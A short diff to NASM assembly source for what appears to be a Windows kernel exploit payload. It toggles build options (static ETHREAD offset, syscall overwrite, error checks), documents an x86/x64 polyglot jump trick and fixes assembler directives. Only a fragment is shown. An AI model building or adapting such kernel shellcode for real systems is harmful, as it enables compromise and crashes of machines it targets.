@@ -39,7 +39,7 @@ global payload_start
 ; options which can be enabled
 %define USE_X86                       ; x86 payload
 %define USE_X64                       ; x64 payload
-%define STATIC_ETHREAD_DELTA          ; use a pre-calculated ThreadListEntry
+;%define STATIC_ETHREAD_DELTA          ; use a pre-calculated ThreadListEntry
 %define ERROR_CHECKS                  ; lessen chance of BSOD, but bigger size
 %define SYSCALL_OVERWRITE             ; to run at process IRQL in syscall
 ; %define CLEAR_DIRECTION_FLAG         ; if cld should be run
@@ -75,13 +75,16 @@ ETHREAD_THREADLISTENTRY_OFFSET             equ     0x420   ; only used if STATIC
 payload_start:
 
   xor ecx, ecx
-  db 0x41                   ; x86 inc ecx, x64 = rex prefix
-  loop x64_payload_start    ; dec, jnz. i.e. in x64 we will now jmp
+  db 0x41                   ; x86 = inc ecx, x64 = rex prefix
+  loop x64_payload_start    ; dec ecx, jnz. i.e. in x64 ecx = -1, we will now jmp
+
+BITS 32
 
 %ifdef USE_X86
+  ret
 %else
   ret
-%end
+%endif
 
 x64_payload_start:
 BITS 64
